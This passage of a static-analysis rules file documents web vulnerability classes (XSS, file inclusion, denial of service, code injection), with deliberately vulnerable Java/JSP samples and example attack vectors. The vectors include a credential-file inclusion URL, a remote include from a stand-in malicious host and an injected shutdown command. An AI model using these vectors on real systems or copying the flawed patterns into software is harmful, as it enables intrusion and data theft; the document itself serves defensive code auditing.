							  Cross-site scripting (XSS) vulnerabilities occur when:<br><br>1. Data enters a web application through an untrusted source. In the case of Reflected XSS, the untrusted source is typically a web request, while in the case of Persisted (also known as Stored) XSS it is typically a database or other back-end datastore.<br><br><br>2. The data is included in dynamic content that is sent to a web user without being validated.<br><br>The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.<br><br><IfNotDef var="ConditionalDescriptions"><br><b>Example 1:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user.<br><br><pre><br>&lt;% String eid = request.getParameter("eid"); %&gt;<br>...<br>Employee ID: &lt;%= eid %&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>The code in this example operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.<br><br>Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.<br><br><IfNotDef var="ConditionalDescriptions"><br><b>Example 2:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.<br><br><pre><br>&lt;%...<br>Statement stmt = conn.createStatement();<br>ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);<br>if (rs != null) {<br>   rs.next();<br>   String name = rs.getString("name");<br>}<br>%&gt;<br><br>Employee Name: &lt;%= name %&gt;<br></pre><br></IfNotDef><br><IfDef var="ConditionalDescriptions"></IfDef><br><br>As in Example 1, this code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a "guestbook" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.<br><br>Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent.<br><br><pre><br>...<br>        WebView webview = (WebView) findViewById(R.id.webview);<br>        webview.getSettings().setJavaScriptEnabled(true);<br>        String url = this.getIntent().getExtras().getString("url");<br>        webview.loadUrl(url);<br>...<br></pre><br><br>If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView.<br><br>As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:<br><br>- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities.<br><br>- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.<br><br>- As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.<br><br><IfDef var="ConditionalDescriptions"></IfDef><br><IfNotDef var="ConditionalDescriptions"><br>A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HP Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HP Fortify user with the auditing process, the HP Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.<br></IfNotDef>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A1 Cross Site Scripting (XSS)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A2 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A3 Cross-Site Scripting (XSS)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A4 Cross Site Scripting</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3580 CAT I</em> <br></p>
																									   <p>[10] Tongbo Luo, Hao Hao, Wenliang Du, Yifei Wang, and Heng Yin <em>Attacks on WebView in the Android System</em> <br></p>
																									   <p>[11] Erika Chin and David Wagner <em>Bifocals: AnalyzingWebView Vulnerabilities in Android Applications</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-site Scripting</em> <br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 79, CWE ID 80</em> <br></p>
																									   <p>[14]  <em>HTML 4.01 Specification</em> W3<br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 079</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.7</em> <br></p>
																									   <p>[22] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>
																									   <p>[23] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[24]  <em>Understanding Malicious Content Mitigation for Web Developers</em> CERT<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_dangerous_file_inclusion
		</key>
		<internalKey>Input Validation and Representation/Dangerous File
			Inclusion
		</internalKey>
		<name>Dangerous File Inclusion</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing unvalidated user input to control files that are included dynamically in a JSP can lead to malicious code execution.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Many modern web scripting languages enable code re-use and modularization through the ability to include additional source files within one encapsulating file. This ability is often used to apply a standard look and feel to an application (templating), share functions without the need for compiled code, or break the code into smaller more manageable files. Included files are interpreted as part of the parent file and executed in the same manner. File inclusion vulnerabilities occur when the path of the included file is controlled by unvalidated user input.<br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br><b>Example 1:</b> The following is an example of Local File Inclusion vulnerability. The sample code takes a user specified template name and includes it in the JSP page to be rendered.<br><pre><br>...<br>&lt;jsp:include page="&lt;%= (String)request.getParameter(\"template\")%&gt;"&gt;<br>...<br></pre><br>If the attacker specifies a valid file to the dynamic include statement, the contents of that file will be passed to the JSP interpreter to be rendered on the page.<br><br>In the case of an attack vector of the form<br><pre><br>specialpage.jsp?template=/WEB-INF/database/passwordDB<br></pre><br>the JSP interpreter will render the contents of the <code>/WEB-INF/database/passwordDB</code> file to the JSP page thus compromising the security of the system.<br><br>Worse, if the attacker can specify a path to a remote site controlled by the attacker, then the dynamic include statement will execute arbitrary malicious code supplied by the attacker.<br><br><b>Example 2:</b>  An example of Remote File Inclusion vulnerability is shown below. The sample code uses the <code>c:import</code> tag to import a user specified remote file into the current JSP page.<br><pre><br>...<br>&lt;c:import url="&lt;%= request.getParameter("privacy")%&gt;"&gt;<br>...<br></pre><br>An attack vector of the form<br><pre><br>policy.jsp?privacy=http://www.malicioushost.com/attackdata.js<br></pre><br>can inject malicious code into the current JSP page from a remote site controlled by the attacker.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A3 Malicious File Execution</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 94, CWE ID 98</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.3</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 094</em> <br></p>
																									   <p>[17] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Risky Resource Management - CWE ID 098</em> <br></p>
																									   <p>[18] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Risky Resource Management - CWE ID 829</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-18 Mobile Code (P2)</em> <br></p>
																									   <p>[20] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_denial_of_service</key>
		<internalKey>Input Validation and Representation/Denial of Service
		</internalKey>
		<name>Denial of Service</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The closing of a session is equivalent to adding a lock to the session resource. The retrieval of data which is dependent on the active session will hang when the session is deactivated, which leads to a denial of service.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Denial of Service attack is an attempt to make a machine or network resource unavailable to its intended users. A DoS vulnerability in an application allows an attacker to prevent legitimate users from accessing services provided by the application. There are many ways to make a service unavailable for legitimate users by manipulating network packets, programming, logical, or resources handling vulnerabilities, among others. Attackers may be able to deny service to legitimate users by flooding the application with requests, but flooding attacks can often be defused at the network layer. One of the more problematic cases is due to bugs that inappropriately release resources which can lead to a halting of an application at runtime.<br><br><b>Example 1:</b> The following code closes a <code>Session</code> before running the query which renders the application to hang at runtime.<br><br><pre><br>  Session session = SessionFactory.openSession();<br>  Criteria criteria = session.CreateCriteria(Location.class);<br>  criteria.add(Expression.eq("zip", zip));<br>  session.close();<br>  data = criteria.list();<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[8] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Denial of Service</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_denial_of_service_parse_double
		</key>
		<internalKey>Input Validation and Representation/Denial of
			Service/Parse Double
		</internalKey>
		<name>Denial of Service: Parse Double</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program calls the method <Replace key="EnclosingFunction.name"/> that parses doubles in <Replace key="PrimaryLocation.file"/> on line <Replace key="PrimaryLocation.line"/> and can cause the thread to hang.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  There is a vulnerability in implementations of<code>java.lang.Double.parseDouble()</code> and related methods that can cause the thread to hang when parsing any number in the range <code>[2^(-1022) - 2^(-1075) : 2^(-1022) - 2^(-1076)]</code>. This defect can be used to execute a DOS (Denial of Service) attack.<br><b>Example:</b> Even if the program does not directly use doubles, it may still be vulnerable.<br><pre><br>protected void processLocale(HttpServletRequest request, HttpServletResponse response)<br>{<br>        Locale locale = request.getLocale();<br>        if (locale != null)<br>        {<br>                session.setAttribute(Globals.LOCALE_KEY, locale);<br>        }<br>}<br></pre><br>The Apache Tomcat implementation of <code>HttpServletRequest</code> uses <code>parseDouble</code> to validate the locale from the Accept-Language header, which makes any call to <code>getLocale()</code> dangerous.<br><br>This vulnerability exists for Java version 6 Update 23 and earlier versions.  It is not present for Java version 6 Update 24 and later.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A9 Using Components with Known Vulnerabilities</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 730</em> <br></p>
																									   <p>[9] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Denial of Service</em> <br></p>
																									   <p>[10] Rick Regan <em>Java Hangs When Converting 2.2250738585072012e-308</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12]  <em>Oracle Security Alert for CVE-2010-4476</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_dynamic_code_evaluation_code_injection
		</key>
		<internalKey>Input Validation and Representation/Dynamic Code
			Evaluation/Code Injection
		</internalKey>
		<name>Dynamic Code Evaluation: Code Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Interpreting user-controlled instructions at run-time can allow attackers to execute malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Many modern programming languages allow dynamic interpretation of source instructions. This capability allows programmers to perform dynamic instructions based on input received from the user. Code injection vulnerabilities occur when the programmer incorrectly assumes that instructions supplied directly from the user will perform only innocent operations, such as performing simple calculations on active user objects or otherwise modifying the user's state. However, without proper validation, a user might specify operations the programmer does not intend.<br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br><b>Example:</b> In this classic code injection example, the application implements a basic calculator that allows the user to specify commands for execution.<br><br><pre><br>...<br>	ScriptEngineManager scriptEngineManager = new ScriptEngineManager();<br>	ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension("js");<br>	userOps = request.getParameter("operation");<br>	Object result = scriptEngine.eval(userOps);<br>...<br></pre><br><br>The program behaves correctly when the <code>operation</code> parameter is a benign value, such as &quot;8 + 7 * 2&quot;, in which case the <code>result</code> variable is assigned a value of 22. However, if an attacker specifies languages operations that are both valid and malicious, those operations would be executed with the full privilege of the parent process. Such attacks are even more dangerous when the underlying language provides access to system resources or allows execution of system commands. For example, Javascript allows invocation of Java objects; if an attacker were to specify &quot; java.lang.Runtime.getRuntime().exec(&quot;shutdown -h now&quot;)&quot; as the value of  <code>operation</code>, a shutdown command would be executed on the host system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 95</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_dynamic_code_evaluation_code_manipulation
		</key>
		<internalKey>Input Validation and Representation/Dynamic Code
			Evaluation/Code Manipulation
		</internalKey>
		<name>Dynamic Code Evaluation: Code Manipulation</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing unvalidated user-input to influence the run-time environment of dynamically executed code can allow attackers to execute malicious code. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Many modern programming languages allow dynamic interpretation of source instructions. This capability allows programmers to execute dynamic operations based on input received from the user. Code manipulation vulnerabilities occur when the programmer allows some user supplied data to alter an aspect of run-time environment of dynamically executed code. Without proper validation, a user might specify operations the programmer does not intend.<br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br><b>Example:</b> In this example, the application retrieves the script execution scope from the web application.<br><br><pre><br>...<br>   ScriptEngineManager scriptEngineManager = new ScriptEngineManager();<br>   ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension("js");<br>   ScriptContext newContext = new SimpleScriptContext();<br>   Bindings engineScope = newContext.getBindings(request.getParameter("userName"));<br><br>   userOps = request.getParameter("operation");<br>   Object result = scriptEngine.eval(userOps,newContext);<br>...<br></pre><br><br>The program behaves correctly when the <code>page_scope</code> parameter is the expected username. However, if an attacker specifies the value for <code>GLOBAL_SCOPE</code>, the operations will have access to all attributes within all engines created by the same <code>ScriptEngine</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 94</em> <br></p>
																									   <p>[8] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 116, Risky Resource Management - CWE ID 094</em> <br></p>
																									   <p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_dynamic_code_evaluation_script_injection
		</key>
		<internalKey>Input Validation and Representation/Dynamic Code
			Evaluation/Script Injection
		</internalKey>
		<name>Dynamic Code Evaluation: Script Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Interpreting user-controlled instructions at run-time can allow attackers to execute malicious code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Many modern programming languages allow dynamic interpretation of source instructions. This capability allows programmers to perform dynamic instructions based on input received from the user. Code injection vulnerabilities occur when the programmer incorrectly assumes that instructions supplied directly from the user will perform only innocent operations, such as performing simple calculations on active user objects or otherwise modifying the user's state. However, without proper validation, a user might specify operations the programmer does not intend.<br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br><b>Example:</b> In this classic code injection example, the application implements a basic calculator that allows the user to specify commands for execution.<br><br><pre><br>...<br>        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();<br>        ScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension("js");<br>        userOps = request.getParameter("operation");<br>        Object result = scriptEngine.eval(userOps);<br>...<br></pre><br><br>The program behaves correctly when the <code>operation</code> parameter is a benign value, such as &quot;8 + 7 * 2&quot;, in which case the <code>result</code> variable is assigned a value of 22. However, if an attacker specifies languages operations that are both valid and malicious, those operations would be executed with the full privilege of the parent process. Such attacks are even more dangerous when the underlying language provides access to system resources or allows execution of system commands. For example, Javascript allows invocation of Java objects; if an attacker were to specify &quot; java.lang.Runtime.getRuntime().exec(&quot;shutdown -h now&quot;)&quot; as the value of  <code>operation</code>, a shutdown command would be executed on the host system.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A3 Malicious File Execution</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
